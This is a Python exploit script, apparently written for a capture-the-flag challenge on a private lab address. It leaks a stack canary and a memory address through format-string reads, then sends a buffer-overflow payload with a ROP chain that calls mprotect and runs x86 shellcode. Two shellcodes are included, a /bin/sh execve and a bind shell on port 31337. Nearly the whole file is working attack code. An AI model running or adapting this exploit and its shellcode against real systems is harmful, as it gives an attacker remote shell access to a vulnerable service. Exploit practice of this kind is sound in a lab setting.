#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *
import re
import sys

ip = '10.211.55.48'
port = 7070

def format_string(io, format = '%70$x'):
    io.writeline(format)
    return search(io.readline())

def search(text):
    log(text, 'yellow')
    # m = re.match('Your number is (.+) which is too low.', text)
    m = re.search('Your number is (.+) which is too low.', text)
    if m:
        return int(m.group(1), 16)
    else:
        log("Can't get the value", 'blue')
        sys.exit(1)

#def get_ret():

#def syscall1(*argv):
#    pop_ebx = 0x8048139  # pop ebx; ret  argc-1
#    return l32(pop_ebx) + l32(argv[0])

#def syscall2(*argv):
#    pop_ecx_ebx = 0x8060A7D # pop ecx; pop ebx; ret argc-2
#    return l32(pop_ecx_ebx) + l32(argv[1]) + l32(argv[0])

#def syscall3(*argv):
#    pop_edx_ecx_ebx = 0x8060A7C # pop edx; pop ecx; pop ebx; ret argc-3
#    return l32(pop_edx_ecx_ebx) + l32(argv[2]) + l32(argv[1]) + l32(argv[0])

#def syscall(num, argc = 2, *argv):
#    int80 = 0x8082735    # int 80h; ret
#    pop_eax = 0x8048139  # pop eax; ret
#    table = {1:syscall1,2:syscall2,3:syscall3}
#    return table[argc](*argv) + l32(pop_eax) + l32(num) + l32(int80)

def rop_chain(memory):
    rop = ''
    mprotect = 0x805FA30
    ret = memory + 292

    # /bin/sh shellcode (need dup2(4,0) dup2(4,1))
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"+\
                "\x68\x68\x2f\x62\x69\x6e\x89"+\
                "\xe3\x89\xc1\x89\xc2\xb0\x0b"+\
                "\xcd\x80\x31\xc0\x40\xcd\x80"

    # shell bind tcp (port: 31337)
    shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"+\
                "\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"+\
                "\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"+\
                "\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10"+\
                "\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"+\
                "\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"+\
                "\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"+\
                "\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"+\
                "\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"+\
                "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"+\
                "\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

    memory = int(str(hex(memory))[:-3] + '000',16)
    log(memory, 'blue')
    #rop += l32(mprotect) + l32(ret) + l32(memory) + l32(0x1000) + l32(0x7)
    rop += l32(mprotect) + l32(ret) + l32(memory) + l32(0x1000) + l32(0x7)
    rop += shellcode
    return rop

def test():
    #test = l32(0x808D970)
    #pop edx ecx ebx
    #jmp     dword ptr [eax]
    return test

def overflow(io, cookie = 0x71403f00, memory = 0x8000000):
    payload = 'x'*256 + l32(cookie) + 'x'*12 + rop_chain(memory)
    io.writeline(payload)
    io.readline()

def win_game(io):
    for i in range(21):
        io.writeline(str(i))
        if 'win' in io.readline():
            break
    io.interact()

io = zio((ip, port), timeout=1000, print_write=COLORED(REPR))
io.read_until('0 and 20: ')

cookie = format_string(io, '%70$x')
log('cookie: ' + hex(cookie), 'red')
memory = format_string(io, '%73$x') - 348
log('memory: ' + hex(memory), 'red')

overflow(io, cookie, memory)
#io.interact()
raw_input()
win_game(io)
